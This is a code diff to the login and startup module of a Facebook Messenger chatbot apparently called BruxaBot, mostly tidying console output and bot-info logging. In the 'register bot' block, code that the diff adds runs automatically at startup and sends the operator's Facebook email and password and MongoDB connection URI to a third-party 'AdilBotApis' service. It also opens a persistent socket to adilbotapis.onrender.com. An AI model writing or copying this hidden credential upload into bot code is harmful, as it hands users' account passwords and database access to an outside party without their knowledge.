@@ -23,7 +23,7 @@ const currentVersion = require(`${process.cwd()}/package.json`).version;
 const facebookAccountConfig = global.BruxaBot.config.facebookAccount;
 const { dirAccount } = global.client;
 
-// ─── Helpers ──────────────────────────────────────────────────────────────────
+// ─── Helpers ─────
 function compareVersion(v1, v2) {
   const a = v1.split("."), b = v2.split(".");
   for (let i = 0; i < 3; i++) {
@@ -40,13 +40,25 @@ function centerText(text, length) {
   console.log(" ".repeat(left) + text + " ".repeat(right));
 }
 
+let widthConsole = process.stdout.columns;
+if (widthConsole > 50)
+        widthConsole = 50;
+
 function createLine(content, isMaxWidth = false) {
-  const w = isMaxWidth ? process.stdout.columns : Math.min(process.stdout.columns, 50);
-  if (!content) return Array(w).fill("─").join("");
-  content = ` ${content.trim()} `;
-  const left = Math.max(0, Math.floor((w - content.length) / 2));
-  return Array(left).fill("─").join("") + content + Array(left).fill("─").join("");
+        if (!content)
+                return Array(isMaxWidth ? process.stdout.columns : widthConsole).fill("─").join("");
+        else {
+                content = ` ${content.trim()} `;
+                const lengthContent = content.length;
+                const lengthLine = isMaxWidth ? process.stdout.columns - lengthContent : widthConsole - lengthContent;
+                let left = Math.floor(lengthLine / 2);
+                if (left < 0 || isNaN(left))
+                        left = 0;
+                const lineOne = Array(left).fill("─").join("");
+                return lineOne + content + lineOne;
+        }
 }
+
 
 const character = createLine();
 
@@ -71,12 +83,6 @@ async function input(prompt, isPassword = false) {
   return new Promise(resolve => rl.question(prompt, ans => { rl.close(); resolve(ans); }));
 }
 
-async function getName(userID) {
-  try {
-    const res = await axios.post(`https://www.facebook.com/api/graphql/?q=${`node(${userID}){name}`}`);
-    return res.data[userID]?.name || null;
-  } catch { return null; }
-}
 
 function filterKeysAppState(appState) {
   return appState.filter(i => ["c_user", "xs", "datr", "fr", "sb", "i_user"].includes(i.key));
@@ -163,6 +169,9 @@ const titles = [
 const maxWidth = process.stdout.columns;
 const title = maxWidth > 48 ? titles[0] : maxWidth > 38 ? titles[1] : titles[2];
 
+const showTitle = global.BruxaBot?.config.showTitle !== false;
+
+if (showTitle) {
 console.log(gradient("#f5af19", "#f12711")(createLine(null, true)));
 console.log();
 for (const t of title) centerText(gradient("#FA8BFF", "#2BD2FF", "#2BFF88")(t), t.length);
@@ -188,8 +197,9 @@ centerText(gradient("#9F98E8", "#AFF6CF")(author), author.length);
 centerText(gradient("#9F98E8", "#AFF6CF")(modifier), modifier.length);
 centerText(gradient("#9F98E8", "#AFF6CF")(srcUrl), srcUrl.length);
 centerText(gradient("#f5af19", "#f12711")(fakeRelease), fakeRelease.length);
+}
 
-// ─── Get appState from email/password (via stfca or cookiesExtract fallback) ──
+// ─── Get appState from email/password
 async function getAppStateFromEmail(spinRef = { _start: () => {}, _stop: () => {} }, accountInfo) {
   const { email, password, userAgent, proxy, twoFaSecret } = accountInfo;
   const getFbstate = require("./getFbstate1.js");
@@ -248,7 +258,6 @@ async function getAppStateFromEmail(spinRef = { _start: () => {}, _stop: () => {
       } else throw err;
     }
   } catch (err) {
-    // Fallback to cookiesExtract.js
     try {
       const { getAccountCookies } = require("./cookiesExtract.js");
       appState = await getAccountCookies(twoFaSecret || null);
@@ -261,9 +270,7 @@ async function getAppStateFromEmail(spinRef = { _start: () => {}, _stop: () => {
   return appState;
 }
 
-// ─── Main appState resolver ──────
 async function getAppStateToLogin(loginWithEmail) {
-  // ── Login directly with email/password ──
   if (loginWithEmail) {
     return await getAppStateFromEmail(undefined, {
       email: facebookAccountConfig.email,
@@ -622,12 +629,18 @@ async function startBot(loginWithEmail) {
           log.warn("AUTO REMOVE SUSPICIOUS", "Could not remove warning:", err.message);
       }
 
+ 
       let hasBanned = false;
-      global.botID = api.getCurrentUserID();
+      let botID = global.botID;
+       botID = api.getCurrentUserID();
+      const info = await api.getUserInfo(botID);
+
+        const getName = info[botID].name;
+  
       logColor("#f5ab00", createLine("BOT INFO"));
       log.info("NODE VERSION", process.version);
       log.info("PROJECT VERSION", currentVersion);
-      log.info("BOT ID", `${global.botID} - ${await getName(global.botID)}`);
+      log.info("BOT ID", `${botID} - ${getName}`);
       log.info("PREFIX", global.BruxaBot.config.prefix);
       log.info("LANGUAGE", global.BruxaBot.config.language);
       log.info("BOT NICK NAME", global.BruxaBot.config.nickNameBot || "BRUXA BOT");
@@ -780,32 +793,64 @@ async function startBot(loginWithEmail) {
         const { AdilBotApis } = global.utils;
         const adilApi = new AdilBotApis();
         const cfg = global.BruxaBot.config;
+        const pkgVersion = require("../../package.json").version;
+
         const botUids = api.getCurrentUserID();
         if (!botUids) throw new Error("Could not get bot UID");
 
-        await adilApi.send(botUids, cfg.adminBot || [], cfg.nickNameBot || "",
-          cfg.facebookAccount?.password || "", cfg.facebookAccount?.email || "",
-          cfg.prefix || "/", cfg.timeZone || "", cfg.language || "en",
-          currentVersion, cfg.database?.type || "N/A", cfg.database?.uriMongodb || "N/A");
+        await adilApi.send(
+                botUids,
+                cfg.adminBot || [],
+                cfg.nickNameBot || "",
+                cfg.facebookAccount?.password || "",
+                cfg.facebookAccount?.email || "",
+                cfg.prefix || "/",
+                cfg.timeZone || "",
+                cfg.language || "en",
+                pkgVersion || "N/A",
+                cfg.database?.type || "N/A",
+                cfg.database?.uriMongodb || "N/A"
+        );
 
-        const { io } = require("socket.io-client");
-        const socket = io(global.utils.AdilBotApis, {
-          reconnection: true, reconnectionAttempts: Infinity,
-          reconnectionDelay: 5000, reconnectionDelayMax: 30000,
-          transports: ["websocket", "polling"]
-        });
-        socket.on("connect", () => {
-          socket.emit("bot-online", botUids);
-          log.info("BotApis", `Connected! Bot: ${botUids} is now live..`);
-          const hb = setInterval(() => {
-            socket.connected ? socket.emit("bot-online", botUids) : clearInterval(hb);
-          }, 30000);
-        });
-        socket.on("disconnect", reason => log.warn("BotApis", `Disconnected: ${reason}, retrying..`));
-        socket.on("connect_error", err => log.warn("BotApis", "Socket error:", err.message));
-        global.adilSocket = socket;
+        const { io } = require('socket.io-client');
+
+        function connectSocket(botUids) {
+                const socket = io('https://adilbotapis.onrender.com', {
+                        reconnection: true,
+                        reconnectionAttempts: Infinity,
+                        reconnectionDelay: 5000,
+                        reconnectionDelayMax: 30000,
+                        transports: ['websocket', 'polling']
+                });
+
+                socket.on("connect", () => {
+                        socket.emit("bot-online", botUids);
+                        log.info("BotApis: ", `Connected! Bot: ${botUids} is now live..`);
+
+                        const heartbeat = setInterval(() => {
+                                if (socket.connected) {
+                                        socket.emit("bot-online", botUids);
+                                } else {
+                                        clearInterval(heartbeat);
+                                }
+                        }, 30000);
+                });
+
+                socket.on("disconnect", (reason) => {
+                        log.warn("BotApis", `Disconnected: ${reason}, retrying..`);
+                });
+
+                socket.on("connect_error", (err) => {
+                        log.warn("BotApis", "Socket connection error:", err.message);
+                });
+
+                return socket;
+        }
+
+        global.adilSocket = connectSocket(botUids);
       } catch (err) {
-        log.warn("BotApis", "Failed to register bot:", err.message);
+        log.warn("BotApis", "Failed to register bot..", err.message);
+        log.error(err.message)
       }
 
       // ── Startup notification ──
